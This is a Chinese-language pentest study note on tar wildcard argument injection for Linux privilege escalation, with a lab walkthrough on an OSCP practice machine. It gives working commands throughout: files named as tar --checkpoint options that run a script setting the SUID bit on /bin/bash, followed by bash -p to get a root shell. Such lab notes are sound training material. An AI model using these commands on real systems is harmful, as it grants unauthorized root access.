# Tar 萬用字元參數注入提權

當系統以高權限執行 `tar` 指令，且參數中使用了萬用字元（`*`）來匹配檔案時，攻擊者可以利用精心命名的檔案，使 `tar` 將這些檔名解析為命令列參數（Flags），進而執行任意系統指令。

## 💥 Tar 萬用字元參數注入

### 漏洞觸發原理

高權限指令碼（例如以 `root` 執行的 cron job）如果在特定目錄下執行了類似以下的指令：
```bash
cd /home/user/app
tar czf /tmp/backup.tar.gz *
```
當 `*` 展開時，目錄下的所有檔案名稱都會被當作參數傳遞給 `tar`。例如，若目錄下存在名為 `--help` 的檔案，指令會被解析為：
```bash
tar czf /tmp/backup.tar.gz --help file1.txt file2.txt
```
藉由建立特殊檔名的檔案，我們可以注入 `tar` 的 `--checkpoint` 和 `--checkpoint-action` 參數來執行任意指令。

### 利用步驟

1. **進入萬用字元作用的目錄**
   ```bash
   cd /home/user/app
   ```

2. **建立惡意執行腳本**
   例如，建立一個賦予 `bash` SUID 的腳本 `shell.sh`：
   ```bash
   echo -e '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
   chmod +x shell.sh
   ```

3. **建立參數偽裝檔案**
   利用 `touch` 建立檔名與 `tar` 參數相同的空檔案：
   ```bash
   # 告訴 tar 每處理一個檔案就觸發一次 checkpoint
   echo "" > '--checkpoint=1'
   
   # 指定觸發 checkpoint 時所要執行的動作為執行我們的腳本
   echo "" > '--checkpoint-action=exec=sh shell.sh'
   ```

4. **等待定時任務觸發**
   當 `tar *` 執行時，它會將上述檔案解析為參數：
   ```bash
   tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh ...
   ```
   定時任務執行完畢後，即可透過以下指令獲取 root Shell：
   ```bash
   bash -p
   ```

# 實戰關聯
*   **靶機應用實例**：
    *   [[Amaterasu]]
    *   [[OSCP-C]]（在 Linux 外網主機 192.168.x.157 上，普通用戶 `cassie` 發現系統背景有一個以 `root` 運行的 cron job，定時執行 `cd /opt/admin && tar -zxf /tmp/backup.tar.gz *`。由於 `cassie` 對 `/opt/admin` 目錄具有寫入權限，藉由 touch 建立 `--checkpoint=1` 和 `--checkpoint-action=exec=sh shell.sh` 兩個惡意參數檔，並將 shell.sh 寫入 `chmod u+s /bin/bash`，等待 cron job 執行後成功取得 `/bin/bash` SUID，最終執行 `/bin/bash -p` 取得 root 權限）。
